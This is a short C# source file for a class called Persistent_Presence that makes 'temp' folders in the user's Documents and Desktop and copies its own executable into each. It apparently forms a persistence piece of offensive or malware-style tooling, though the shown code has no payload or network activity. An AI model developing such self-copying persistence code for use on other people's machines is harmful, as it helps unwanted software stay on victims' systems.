using System;
using System.Diagnostics;
using System.IO;

namespace Persistent_Presence
{
    class Persistent_Presence
    {
        // private string primary_path_location = @"C:\Users\Anthony\source\repos\Persistent_Presence\bin\Debug\netcoreapp3.1\temp";
        private string primary_path_location = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\temp";
        private string seconday_path_location = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\temp";
        private string exe_location = Directory.GetCurrentDirectory() + @"\Persistent_Presence.exe";

        public void check_executable_location()
        {
            Debug.WriteLine(primary_path_location);
            // Create folder in "Program Files" and store executable.
            if (!System.IO.Directory.Exists(primary_path_location))
            {
                System.IO.Directory.CreateDirectory(primary_path_location);
                Debug.WriteLine(string.Format("[+] Creating {0}", primary_path_location));
                duplicate_executables(primary_path_location);
            }
            else
            {
                Debug.WriteLine(string.Format("[=] {0} already exist.", primary_path_location));
            }
            if (!System.IO.Directory.Exists(seconday_path_location))
            {
                System.IO.Directory.CreateDirectory(seconday_path_location);
                Debug.WriteLine(string.Format("[+] Creating {0}", seconday_path_location));
                duplicate_executables(seconday_path_location);
            }
            else
            {
                Debug.WriteLine(string.Format("[=] {0} already exist.", seconday_path_location));
            }
        }
        private void duplicate_executables(string path_location)
        {
            File.Copy(exe_location, path_location + @"\Persistent_Presence.exe");
        }
    }
}
